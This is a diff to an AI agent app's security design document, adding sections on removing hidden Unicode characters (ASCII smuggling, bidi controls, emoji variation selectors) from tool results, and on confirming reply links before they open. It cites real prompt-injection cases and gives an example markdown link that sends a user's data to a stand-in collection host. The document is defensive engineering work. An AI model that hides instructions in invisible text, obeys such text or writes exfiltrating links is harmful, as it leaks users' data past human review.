@@ -1,6 +1,6 @@
 # Run-level taint: untrusted input, egress and memory
 
-Status: shipped in 0.1.4; the disclosure rule and Allow site in 0.1.5. Code: `core/agent/.../Taint.kt`, `AgentLoop.authorizeAndRun`, `tools/WebTools.kt` (`FetchGuard`), `home/AgentHome.kt` (memory provenance), `core/browser` (`SensitiveActions.*Gate`, `locus-agent.js`).
+Status: shipped in 0.1.4; the disclosure rule and Allow site in 0.1.5; hidden characters and links in replies unreleased. Code: `core/agent/.../Taint.kt`, `AgentLoop.authorizeAndRun`, `tools/WebTools.kt` (`FetchGuard`), `home/AgentHome.kt` (memory provenance), `core/browser` (`SensitiveActions.*Gate`, `locus-agent.js`).
 
 ## The problem
 
@@ -183,6 +183,117 @@ The audit log stores a call's arguments as the model sent them. The Activity scr
 - **Fail closed.** When `inspect` returns nothing (the page didn't answer, answered garbage, or the element is gone), the call now asks with "Locus couldn't check what this does on <host>". Before, it went ahead (`SensitiveActionsTest.missingFactsFailClosed`).
 - **Injected at document start.** `locus-agent.js` is added with `WebViewCompat.addDocumentStartJavaScript(webView, script, setOf("*"))` when `WebViewFeature.DOCUMENT_START_SCRIPT` is supported (androidx.webkit 1.18.0, https://developer.android.com/reference/androidx/webkit/WebViewCompat#addDocumentStartJavaScript(android.webkit.WebView,java.lang.String,java.util.Set%3Cjava.lang.String%3E)). It returns a `ScriptHandler`. The script runs before the page's own scripts on every document the view loads. It ends by making `window.__locus` non-writable and non-configurable, and its functions read-only, so a page can no longer define its own `__locus` first or swap `inspect` for one that reports "Pay now" as harmless. The old injection in `onPageFinished` stays as a fallback; the script is idempotent.
 - **Residual risk.** The helper still uses the page's DOM APIs at call time, and a page can patch those (for example `Element.prototype.getAttribute`). Capturing the natives at document start would close that; it's a larger rewrite of the helper.
+
+## Hidden characters
+
+Status: unreleased. Code: `core/model/.../HiddenText.kt`, `UntrustedContent.wrap`, `tools/WorkspaceTools.kt` (`read_file`), `tools/TextEdits.kt`, `home/HomeTools.kt` (`memory_save`), `home/SkillImport.kt`, `home/SkillReview.kt`, `core/data/.../mcp/McpTools.kt` (`McpSchemas`), `widget/WidgetFeed.kt`. Tests: `HiddenTextTest`, `HiddenCharactersTest`, `SnapshotTest.pageTextLosesHiddenCharacters`, `McpToolPinningTest`.
+
+### The problem
+
+Text can carry characters a model reads but a person never sees. The best known are the **Unicode tag characters**, U+E0000–E007F: a block that mirrors ASCII and that most interfaces don't draw at all ("ASCII smuggling"). Other invisible carriers are zero-width characters, the bidi controls that reorder what a person sees, and runs of variation selectors after one visible character.
+
+These attacks have all been shown in practice:
+
+- Tags were used to hide instructions from users in prompt injections (Rehberger, "Hiding and finding text with Unicode Tags", 2024-01-14, https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/). The post recommends filtering them out of prompts and responses.
+- Sourcegraph fixed this in its Amp coding agent (https://embracethered.com/blog/posts/2025/amp-code-fixed-invisible-prompt-injection/, 2025-08-16).
+- Hidden tags in a backdoored Agent Skill got past human review and made the agent run a remote script (https://embracethered.com/blog/posts/2026/scary-agent-skills/, 2026-02-11).
+- Bytes can be hidden "inside an emoji" as variation selectors (Butler, https://paulbutler.org/2025/smuggling-arbitrary-data-through-an-emoji/, 2025-02-08).
+- Bidi overrides can make code read differently from how it runs ("Trojan Source", CVE-2021-42574).
+
+Before this change, `UntrustedContent.wrap` only defused its own closing tag, and the one stripper Locus had (`WidgetFeed.stripInvisible`) served only the home-screen widget.
+
+### What the standards say
+
+- **UTS #39, Unicode Security Mechanisms** (revision 34, Unicode 18.0, https://www.unicode.org/reports/tr39/), §3.1:
+  - Default_Ignorable code points have Identifier_Status Restricted.
+  - Since Unicode 15.0, ZWJ and ZWNJ are Default_Ignorable too.
+  - Implementations that keep the two joiners "should" limit them to the contexts in §3.1.1.1. These are A1 (ZWNJ breaking a cursive connection between joining letters), A2 (ZWNJ after a virama) and B (ZWJ after a virama, not followed by a dependent vowel).
+  - The confusable skeleton (§4) removes every Default_Ignorable code point.
+- **UTR #36, Unicode Security Considerations** (https://www.unicode.org/reports/tr36/) has been stabilized and unmaintained since 2014. It defers to UTS #39 and UTS #55.
+- **UTS #55, Unicode Source Code Handling** (version 2, revision 5, https://www.unicode.org/reports/tr55/), §4.2 and §5.1.6:
+  - Tools should make default-ignorable characters visible rather than forbid them in source code.
+  - They may warn where a directional control's effect crosses tokens.
+- **UTS #51, Unicode Emoji** (revision 31, https://www.unicode.org/reports/tr51/):
+  - ED-16: an emoji ZWJ sequence joins emoji with U+200D.
+  - ED-14a: an emoji tag sequence is a base, then tag characters U+E0020–E007E, then U+E007F CANCEL TAG. The only recommended ones are the flags of England, Scotland and Wales.
+
+### What Locus does
+
+`HiddenText.clean` is one shared, pure function in `core:model`, the lowest module, so every layer can use it.
+
+It removes:
+
+- **Tag characters.** The one exception is the three RGI subdivision flags: U+1F3F4, the tags `gbeng`, `gbsct` or `gbwls`, then CANCEL TAG. A black flag followed by any other tags loses them.
+- **Bidi controls:** U+061C, U+200E, U+200F, U+202A–202E and U+2066–2069.
+- **Other invisible format characters:**
+  - zero-width space, word joiner, the invisible operators U+2061–2064, BOM and soft hyphen;
+  - Mongolian vowel separator, interlinear annotation marks, and the deprecated format characters U+206A–206F;
+  - Hangul fillers and Khmer inherent vowels;
+  - any other General_Category Cf character.
+- **Extra selectors.** A variation selector, combining grapheme joiner or Mongolian free variation selector is kept only directly after a visible character, one at a time.
+
+It keeps:
+
+- **ZWJ and ZWNJ** when a single joiner sits between two non-ASCII letters, marks or symbols, or a ZWJ follows an Indic virama. This is a looser reading of UTS #39's A1, A2 and B that also allows emoji ZWJ sequences. Variation selectors and skin-tone modifiers before the joiner count as part of the emoji.
+- **Joiners in context:** Persian words joined with ZWNJ, Devanagari half forms (virama plus ZWJ), Sinhala yansaya, Malayalam old-style chillus, every ZWJ emoji (families, professions with skin tones, the rainbow and transgender flags, newer emoji the JDK doesn't know), and keycaps.
+- **Visible format characters:** the Arabic number signs U+0600–0605 and Egyptian hieroglyph controls.
+- **Control characters.** Line breaks, tabs and ESC stay, so command output and files read as before.
+
+It removes:
+
+- **Misplaced joiners.** A joiner next to ASCII, whitespace, another joiner, or at either end of the text. Zero-width binary between Latin letters is gone.
+
+Removing these characters is a deliberate step past UTS #55, which advises editors not to forbid them. What the model reads is not an editor: a person reviewing it can't see the characters, and the model still acts on them.
+
+### Where it applies
+
+Only to tool-result text from now on. The frozen system prompt and the declared tool list never change, so cached prefixes stay valid. When anything was removed, the result says so on a line of its own after the source note, and the user sees that line too: "(Locus removed 37 hidden characters from the text above: text a person can't see.)".
+
+| Entry point | Where |
+|---|---|
+| Every marked tool result: `fetch_url`, `web_search`, `web_read`, `wikipedia`, email lists, bodies and subjects, GitHub issues, deploy logs, DNS records, `connector_call`, MCP results and `mcp_list_tools`, `find_tools`' MCP descriptions, command and SSH output, calendar entries, events, imported skills loaded with `skill_use` | `UntrustedContent.wrap`. It strips first and then defuses, so `</untrusted<ZWSP>_web_content>` with a zero-width space can't become a real closing tag once stripped. |
+| Web pages, snapshots, tabs and console logs | core:browser's `Untrusted.wrap`, which now calls `UntrustedContent.wrap` |
+| MCP tool descriptions and argument schemas offered as deferred tools (provider-side tool search) | `McpSchemas.description` and `McpSchemas.compact`. These are outside any marked block, so every string in them is stripped. |
+| File reads | `read_file`, line by line, with a note that names the lines. `edit_file`'s whole-line matching compares lines without hidden characters, so the model can edit a line exactly as it read it. |
+| Memory | `memory_save` in a run that read outside content strips topic, summary and note. The summary goes into every new chat's memory index. The user's own chats are left alone. |
+| Imported skills | SKILL.md (name and description included) is cleaned before validation and saving, so the review and the model see the same text. Other files are left as they are, since a script might need its characters; each text file that has hidden characters is named in the import review with a count (UTS #55's "make it visible"). |
+| The review screens | Library's import sheet lists what was removed from SKILL.md and which files hold hidden characters. The MCP tool review says how many hidden characters a new description has. |
+| The home-screen widget | `WidgetFeed.stripInvisible` now calls the shared function. Emoji ZWJ sequences there survive instead of splitting. |
+
+Limits:
+
+- One selector per visible character is still allowed, so a variation-selector channel of about a byte per character remains. Recovering it takes a decoder, and a model doesn't run one by itself.
+- Lookalike letters (confusables) aren't touched; that is UTS #39's skeleton, a different problem.
+- Scripts in skills keep their characters. They run in Linux and aren't instructions to the model.
+
+## Links in replies
+
+Status: unreleased. Code: `core/agent/.../LinkGuard.kt`, `feature/chat/.../LinkGuardUi.kt` (`GuardedLinks`, `LinkConfirmSheet`), `ChatMarkdown.kt`, `ChatViewModel` (`markOutsideContent`, `ChatUiState.links`). Tests: `LinkGuardTest`; renders `sheet-link-confirm`, `sheet-link-confirm-long-query`.
+
+A reply can carry data out without any tool call. The model writes `[details](https://collect.example/p?d=<the user's data>)` after reading a hostile page, and one tap sends it. This is the link form of markdown-image exfiltration (Eclipse Theia CVE-2026-22551). Taint covers the agent's own `browser_open` and `fetch_url`; the user's tap went through Compose's default `LocalUriHandler`, so nothing checked it.
+
+The Markdown renderer (mikepenz multiplatform-markdown-renderer 0.46.0) opens a `LinkAnnotation.Url` through `LocalUriHandler` in its default `annotatorSettings` (checked in the v0.46.0 source, `AnnotatorSettings.kt`). `GuardedLinks` replaces that handler around every chat Markdown view: saved replies, streaming replies and kept reasoning. Each tap goes through `LinkGuard.check`:
+
+- **Asks if the reply came after outside content** and the link's host isn't one the user named. "After outside content" means any reply after the chat's first taint source (`LinkGuard.repliesAfterOutsideContent`), since taint carries over to every later run. "Named" means hosts the user typed in the chat, or hosts set up in Locus as model providers or connectors; subdomains count, `www.` is ignored, and loopback always counts. This is taint's own trusted-host rule.
+- **Asks if the query and fragment are longer than 40 characters**, in any reply and on any host: room for a key or a sentence of someone's data, more than a search or an anchor needs.
+- **Asks if it isn't a web, mail or phone link** (`intent:`, `file:` …).
+- **Otherwise it opens in one tap.** That includes every plain link in a reply written before the chat read anything, and links to named hosts.
+
+The sheet (`LinkConfirmSheet`, the design system's `ConfirmSheet` in the Caution tone) shows:
+
+- why it asked;
+- "Goes to" with the host;
+- the full address in a code surface, the host bold in the caution colour and the rest muted;
+- **Copy link**, **Cancel** and **Open**.
+
+Text outside a known reply, such as helpers and side questions, uses the careful default: treated as written after outside content.
+
+Remote images are still never loaded. The renderer has no image loader configured: there is no coil or other loader in `gradle/libs.versions.toml`, and no image transformer in `core/markdown`. This change leaves that alone.
+
+Limits:
+
+- Links in tool rows, artifacts and other views aren't covered; artifacts have no network.
+- Copying a link and pasting it into a browser isn't checked.
 
 ## Limits
 
